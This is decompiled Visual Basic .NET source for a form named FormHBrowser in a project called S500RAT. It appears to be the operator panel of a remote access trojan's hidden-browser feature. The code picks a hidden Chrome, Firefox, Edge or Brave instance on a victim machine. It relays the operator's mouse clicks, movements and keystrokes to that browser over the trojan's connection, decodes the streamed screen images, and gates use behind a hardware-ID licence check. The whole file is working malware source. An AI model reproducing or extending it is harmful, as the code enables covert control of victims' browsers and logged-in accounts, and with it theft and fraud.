Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S.StreamLibrary
Imports S.StreamLibrary.UnsafeCodecs
Imports S500RAT.My.Resources
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200001C RID: 28
	<DesignerGenerated()>
	Public Partial Class FormHBrowser
		Inherits Form

		' Token: 0x17000191 RID: 401
		' (get) Token: 0x060003D9 RID: 985 RVA: 0x000228F4 File Offset: 0x00020AF4
		' (set) Token: 0x060003DA RID: 986 RVA: 0x00022900 File Offset: 0x00020B00
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000192 RID: 402
		' (get) Token: 0x060003DB RID: 987 RVA: 0x00022943 File Offset: 0x00020B43
		' (set) Token: 0x060003DC RID: 988 RVA: 0x0002294D File Offset: 0x00020B4D
		Private Overridable Property Label2 As Label

		' Token: 0x17000193 RID: 403
		' (get) Token: 0x060003DD RID: 989 RVA: 0x00022956 File Offset: 0x00020B56
		' (set) Token: 0x060003DE RID: 990 RVA: 0x00022960 File Offset: 0x00020B60
		Public Overridable Property FPS As Label

		' Token: 0x17000194 RID: 404
		' (get) Token: 0x060003DF RID: 991 RVA: 0x00022969 File Offset: 0x00020B69
		' (set) Token: 0x060003E0 RID: 992 RVA: 0x00022973 File Offset: 0x00020B73
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000195 RID: 405
		' (get) Token: 0x060003E1 RID: 993 RVA: 0x0002297C File Offset: 0x00020B7C
		' (set) Token: 0x060003E2 RID: 994 RVA: 0x00022986 File Offset: 0x00020B86
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000196 RID: 406
		' (get) Token: 0x060003E3 RID: 995 RVA: 0x0002298F File Offset: 0x00020B8F
		' (set) Token: 0x060003E4 RID: 996 RVA: 0x00022999 File Offset: 0x00020B99
		Private Overridable Property Label1 As Label

		' Token: 0x17000197 RID: 407
		' (get) Token: 0x060003E5 RID: 997 RVA: 0x000229A2 File Offset: 0x00020BA2
		' (set) Token: 0x060003E6 RID: 998 RVA: 0x000229AC File Offset: 0x00020BAC
		Public Overridable Property StateHApp As Label

		' Token: 0x17000198 RID: 408
		' (get) Token: 0x060003E7 RID: 999 RVA: 0x000229B5 File Offset: 0x00020BB5
		' (set) Token: 0x060003E8 RID: 1000 RVA: 0x000229BF File Offset: 0x00020BBF
		Friend Overridable Property Guna2ResizeBox2 As Guna2ResizeBox

		' Token: 0x17000199 RID: 409
		' (get) Token: 0x060003E9 RID: 1001 RVA: 0x000229C8 File Offset: 0x00020BC8
		' (set) Token: 0x060003EA RID: 1002 RVA: 0x000229D4 File Offset: 0x00020BD4
		Public Overridable Property StartAndStop As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._StartAndStop
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.StartAndStop_Click
				Dim startAndStop As Guna2GradientButton = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					RemoveHandler startAndStop.Click, value2
				End If
				Me._StartAndStop = value
				startAndStop = Me._StartAndStop
				If startAndStop IsNot Nothing Then
					AddHandler startAndStop.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019A RID: 410
		' (get) Token: 0x060003EB RID: 1003 RVA: 0x00022A17 File Offset: 0x00020C17
		' (set) Token: 0x060003EC RID: 1004 RVA: 0x00022A24 File Offset: 0x00020C24
		Friend Overridable Property PictureBox1 As PictureBox
			<CompilerGenerated()>
			Get
				Return Me._PictureBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As MouseEventHandler = AddressOf Me.PictureBox1_MouseDown
				Dim value3 As MouseEventHandler = AddressOf Me.PictureBox1_MouseUp
				Dim value4 As MouseEventHandler = AddressOf Me.PictureBox1_MouseMove
				Dim pictureBox As PictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					RemoveHandler pictureBox.MouseDown, value2
					RemoveHandler pictureBox.MouseUp, value3
					RemoveHandler pictureBox.MouseMove, value4
				End If
				Me._PictureBox1 = value
				pictureBox = Me._PictureBox1
				If pictureBox IsNot Nothing Then
					AddHandler pictureBox.MouseDown, value2
					AddHandler pictureBox.MouseUp, value3
					AddHandler pictureBox.MouseMove, value4
				End If
			End Set
		End Property

		' Token: 0x1700019B RID: 411
		' (get) Token: 0x060003ED RID: 1005 RVA: 0x00022A9D File Offset: 0x00020C9D
		' (set) Token: 0x060003EE RID: 1006 RVA: 0x00022AA7 File Offset: 0x00020CA7
		Friend Overridable Property PLW As Guna2CircleProgressBar

		' Token: 0x1700019C RID: 412
		' (get) Token: 0x060003EF RID: 1007 RVA: 0x00022AB0 File Offset: 0x00020CB0
		' (set) Token: 0x060003F0 RID: 1008 RVA: 0x00022ABC File Offset: 0x00020CBC
		Friend Overridable Property ComboBox1 As UIComboBox
			<CompilerGenerated()>
			Get
				Return Me._ComboBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox1_SelectedIndexChanged
				Dim comboBox As UIComboBox = Me._ComboBox1
				If comboBox IsNot Nothing Then
					RemoveHandler comboBox.SelectedIndexChanged, value2
				End If
				Me._ComboBox1 = value
				comboBox = Me._ComboBox1
				If comboBox IsNot Nothing Then
					AddHandler comboBox.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700019D RID: 413
		' (get) Token: 0x060003F1 RID: 1009 RVA: 0x00022AFF File Offset: 0x00020CFF
		' (set) Token: 0x060003F2 RID: 1010 RVA: 0x00022B09 File Offset: 0x00020D09
		Friend Overridable Property Quality As Guna2HtmlLabel

		' Token: 0x1700019E RID: 414
		' (get) Token: 0x060003F3 RID: 1011 RVA: 0x00022B12 File Offset: 0x00020D12
		' (set) Token: 0x060003F4 RID: 1012 RVA: 0x00022B1C File Offset: 0x00020D1C
		Friend Overridable Property QualityUsing As Guna2TrackBar
			<CompilerGenerated()>
			Get
				Return Me._QualityUsing
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TrackBar)
				Dim value2 As ScrollEventHandler = AddressOf Me.QualityUsing_Scroll
				Dim qualityUsing As Guna2TrackBar = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					RemoveHandler qualityUsing.Scroll, value2
				End If
				Me._QualityUsing = value
				qualityUsing = Me._QualityUsing
				If qualityUsing IsNot Nothing Then
					AddHandler qualityUsing.Scroll, value2
				End If
			End Set
		End Property

		' Token: 0x1700019F RID: 415
		' (get) Token: 0x060003F5 RID: 1013 RVA: 0x00022B5F File Offset: 0x00020D5F
		' (set) Token: 0x060003F6 RID: 1014 RVA: 0x00022B69 File Offset: 0x00020D69
		Friend Overridable Property SizeImage As Label

		' Token: 0x170001A0 RID: 416
		' (get) Token: 0x060003F7 RID: 1015 RVA: 0x00022B72 File Offset: 0x00020D72
		' (set) Token: 0x060003F8 RID: 1016 RVA: 0x00022B7C File Offset: 0x00020D7C
		Private Overridable Property Label6 As Label

		' Token: 0x170001A1 RID: 417
		' (get) Token: 0x060003F9 RID: 1017 RVA: 0x00022B85 File Offset: 0x00020D85
		' (set) Token: 0x060003FA RID: 1018 RVA: 0x00022B8F File Offset: 0x00020D8F
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170001A2 RID: 418
		' (get) Token: 0x060003FB RID: 1019 RVA: 0x00022B98 File Offset: 0x00020D98
		' (set) Token: 0x060003FC RID: 1020 RVA: 0x00022BA2 File Offset: 0x00020DA2
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170001A3 RID: 419
		' (get) Token: 0x060003FD RID: 1021 RVA: 0x00022BAB File Offset: 0x00020DAB
		' (set) Token: 0x060003FE RID: 1022 RVA: 0x00022BB8 File Offset: 0x00020DB8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001A4 RID: 420
		' (get) Token: 0x060003FF RID: 1023 RVA: 0x00022BFB File Offset: 0x00020DFB
		' (set) Token: 0x06000400 RID: 1024 RVA: 0x00022C05 File Offset: 0x00020E05
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170001A5 RID: 421
		' (get) Token: 0x06000401 RID: 1025 RVA: 0x00022C0E File Offset: 0x00020E0E
		' (set) Token: 0x06000402 RID: 1026 RVA: 0x00022C18 File Offset: 0x00020E18
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170001A6 RID: 422
		' (get) Token: 0x06000403 RID: 1027 RVA: 0x00022C21 File Offset: 0x00020E21
		' (set) Token: 0x06000404 RID: 1028 RVA: 0x00022C2B File Offset: 0x00020E2B
		Public Property Client As Clients

		' Token: 0x170001A7 RID: 423
		' (get) Token: 0x06000405 RID: 1029 RVA: 0x00022C34 File Offset: 0x00020E34
		' (set) Token: 0x06000406 RID: 1030 RVA: 0x00022C3E File Offset: 0x00020E3E
		Public Property F As FormS500

		' Token: 0x170001A8 RID: 424
		' (get) Token: 0x06000407 RID: 1031 RVA: 0x00022C47 File Offset: 0x00020E47
		' (set) Token: 0x06000408 RID: 1032 RVA: 0x00022C51 File Offset: 0x00020E51
		Public Property FullPath As String

		' Token: 0x170001A9 RID: 425
		' (get) Token: 0x06000409 RID: 1033 RVA: 0x00022C5A File Offset: 0x00020E5A
		' (set) Token: 0x0600040A RID: 1034 RVA: 0x00022C64 File Offset: 0x00020E64
		Friend Property ParentClient As Clients

		' Token: 0x170001AA RID: 426
		' (get) Token: 0x0600040B RID: 1035 RVA: 0x00022C6D File Offset: 0x00020E6D
		' (set) Token: 0x0600040C RID: 1036 RVA: 0x00022C77 File Offset: 0x00020E77
		Public Property GetImage As Image

		' Token: 0x0600040D RID: 1037 RVA: 0x00022C80 File Offset: 0x00020E80
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormHBrowser_Load
			AddHandler MyBase.Resize, AddressOf Me.FormHBrowser_Resize
			Me.FormSize = False
			Me.IntFPS = 0
			Me.sw = Stopwatch.StartNew()
			Me.decoder = New UnsafeStreamCodec(60, True)
			Me.syncPicbox = RuntimeHelpers.GetObjectValue(New Object())
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600040E RID: 1038 RVA: 0x00022CFC File Offset: 0x00020EFC
		Private Sub FormHBrowser_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Dim pictureBox As PictureBox = Me.PictureBox1
			Dim obj As Object = pictureBox
			SyncLock obj
				Dim pictureBox2 As Control = Me.PictureBox1
				AddHandler pictureBox2.KeyPress, AddressOf Me.KDW
			End SyncLock
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.PictureBox1.Focus()
			Me.ComboBox1.SelectedIndex = 0
		End Sub

		' Token: 0x0600040F RID: 1039 RVA: 0x00022EE8 File Offset: 0x000210E8
		Public Sub KDW(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1 IsNot Nothing
			If flag Then
				Me.PictureBox1.Focus()
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "KeyboardDown"
				msgPack.ForcePathObject("Key").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(Conversions.ToString(e.KeyChar)))
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000410 RID: 1040 RVA: 0x00022F90 File Offset: 0x00021190
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000411 RID: 1041 RVA: 0x00022FFC File Offset: 0x000211FC
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Close"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000412 RID: 1042 RVA: 0x00023078 File Offset: 0x00021278
		Private Sub FormHBrowser_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			Dim flag2 As Boolean
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
			flag2 = (Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1 IsNot Nothing)
			If flag2 Then
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Resize"
					msgPack.ForcePathObject("x").AsInteger = CLng(Convert.ToInt32(Me.PictureBox1.Width))
					msgPack.ForcePathObject("y").AsString = Conversions.ToString(Convert.ToInt32(Me.PictureBox1.Height))
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000413 RID: 1043 RVA: 0x000231E0 File Offset: 0x000213E0
		Private Sub StartAndStop_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Start", False) = 0
				If flag Then
					Me.StartAndStop.Enabled = False
					Me.StartAndStop.Text = "Please wait ..."
					Dim msgPack As MsgPack = New MsgPack()
					Me.decoder = New UnsafeStreamCodec(Convert.ToInt32(Me.QualityUsing.Value), True)
					msgPack.ForcePathObject("Packet").AsString = "Start"
					msgPack.ForcePathObject("HandelName").AsString = Me.GetListBrowser().ToString()
					msgPack.ForcePathObject("x").AsInteger = CLng(Convert.ToInt32(Me.PictureBox1.Width))
					msgPack.ForcePathObject("y").AsString = Conversions.ToString(Convert.ToInt32(Me.PictureBox1.Height))
					msgPack.ForcePathObject("Quality").AsString = Conversions.ToString(Convert.ToInt32(Convert.ToInt32(Me.QualityUsing.Value)))
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Else
					Me.StartAndStop.Enabled = False
					Me.StartAndStop.Text = "Please wait ..."
					Dim msgPack2 As MsgPack = New MsgPack()
					msgPack2.ForcePathObject("Packet").AsString = "Stop"
					msgPack2.ForcePathObject("HandelName").AsString = Me.GetListBrowser().ToString()
					msgPack2.ForcePathObject("x").AsInteger = CLng(Convert.ToInt32(Me.PictureBox1.Width))
					msgPack2.ForcePathObject("y").AsString = Conversions.ToString(Convert.ToInt32(Me.PictureBox1.Height))
					msgPack2.ForcePathObject("Quality").AsString = Conversions.ToString(Convert.ToInt32(Convert.ToInt32(Me.QualityUsing.Value)))
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000414 RID: 1044 RVA: 0x0002342C File Offset: 0x0002162C
		Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs)
			Try
				Dim size As Size = New Size(Conversions.ToInteger(Me.PictureBox1.Width), Conversions.ToInteger(Me.PictureBox1.Height))
				Dim point As Point = New Point(CInt(Math.Round(CDbl(e.X) * (CDbl(size.Width) / CDbl(Me.PictureBox1.Width)))), CInt(Math.Round(CDbl(e.Y) * (CDbl(size.Height) / CDbl(Me.PictureBox1.Height)))))
				Dim pictureBox As PictureBox = Me.PictureBox1
				Dim obj As Object = pictureBox
				SyncLock obj
					Dim flag2 As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1 IsNot Nothing
					If flag2 Then
						Dim flag3 As Boolean = e.Button = MouseButtons.Left
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "MouseLeftDown"
							msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
						Dim flag4 As Boolean = e.Button = MouseButtons.Right
						If flag4 Then
							Dim msgPack2 As MsgPack = New MsgPack()
							msgPack2.ForcePathObject("Packet").AsString = "MouseRightDown"
							msgPack2.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack2.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
						End If
					End If
				End SyncLock
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000415 RID: 1045 RVA: 0x0002365C File Offset: 0x0002185C
		Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs)
			Try
				Dim size As Size = New Size(Conversions.ToInteger(Me.PictureBox1.Width), Conversions.ToInteger(Me.PictureBox1.Height))
				Dim point As Point = New Point(CInt(Math.Round(CDbl(e.X) * (CDbl(size.Width) / CDbl(Me.PictureBox1.Width)))), CInt(Math.Round(CDbl(e.Y) * (CDbl(size.Height) / CDbl(Me.PictureBox1.Height)))))
				Dim pictureBox As PictureBox = Me.PictureBox1
				Dim obj As Object = pictureBox
				SyncLock obj
					Dim flag2 As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1 IsNot Nothing
					If flag2 Then
						Dim flag3 As Boolean = e.Button = MouseButtons.Left
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "MouseLeftUp"
							msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
						Dim flag4 As Boolean = e.Button = MouseButtons.Right
						If flag4 Then
							Dim msgPack2 As MsgPack = New MsgPack()
							msgPack2.ForcePathObject("Packet").AsString = "MouseRightUp"
							msgPack2.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack2.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
						End If
					End If
				End SyncLock
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000416 RID: 1046 RVA: 0x0002388C File Offset: 0x00021A8C
		Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.StartAndStop.Text, "Stop", False) = 0 AndAlso Me.PictureBox1 IsNot Nothing
			If flag Then
				Try
					Me.PictureBox1.Focus()
					Dim size As Size = New Size(Conversions.ToInteger(Me.PictureBox1.Width), Conversions.ToInteger(Me.PictureBox1.Height))
					Dim point As Point = New Point(CInt(Math.Round(CDbl(e.X) * (CDbl(size.Width) / CDbl(Me.PictureBox1.Width)))), CInt(Math.Round(CDbl(e.Y) * (CDbl(size.Height) / CDbl(Me.PictureBox1.Height)))))
					Dim pictureBox As PictureBox = Me.PictureBox1
					Dim obj As Object = pictureBox
					SyncLock obj
						Dim flag3 As Boolean = Me.PictureBox1.Image IsNot Nothing
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "MouseMove"
							msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
					End SyncLock
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000417 RID: 1047 RVA: 0x00023A48 File Offset: 0x00021C48
		Public Function GetListBrowser() As Object
			Dim result As String = ""
			Dim flag As Boolean = Me.ComboBox1.SelectedIndex = 0
			If flag Then
				result = "chrome"
				Me.PLW.Image = Resources.HiddenChrome
			Else
				Dim flag2 As Boolean = Me.ComboBox1.SelectedIndex = 1
				If flag2 Then
					result = "firefox"
					Me.PLW.Image = Resources.HiddenFirefox
				Else
					Dim flag3 As Boolean = Me.ComboBox1.SelectedIndex = 2
					If flag3 Then
						result = "edge"
						Me.PLW.Image = Resources.HiddenEdge
					Else
						Dim flag4 As Boolean = Me.ComboBox1.SelectedIndex = 3
						If flag4 Then
							result = "brave"
							Me.PLW.Image = Resources.HiddenBrave
						End If
					End If
				End If
			End If
			Return result
		End Function

		' Token: 0x06000418 RID: 1048 RVA: 0x00023B18 File Offset: 0x00021D18
		Private Sub QualityUsing_Scroll(sender As Object, e As ScrollEventArgs)
			Try
				Dim flag As Boolean = Me.QualityUsing.Value < 11
				If flag Then
					Me.Quality.Text = Conversions.ToString(10) + "%Quality"
				Else
					Me.Quality.Text = Conversions.ToString(Me.QualityUsing.Value) + "%Quality"
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000419 RID: 1049 RVA: 0x00023BA4 File Offset: 0x00021DA4
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Me.GetListBrowser()
		End Sub

		' Token: 0x040001D2 RID: 466
		Private FormSize As Boolean

		' Token: 0x040001D3 RID: 467
		Public IntFPS As Integer

		' Token: 0x040001D4 RID: 468
		Public sw As Stopwatch

		' Token: 0x040001D5 RID: 469
		Public decoder As IUnsafeCodec

		' Token: 0x040001D6 RID: 470
		Public rdSize As Size

		' Token: 0x040001D7 RID: 471
		Public syncPicbox As Object
	End Class
End Namespace
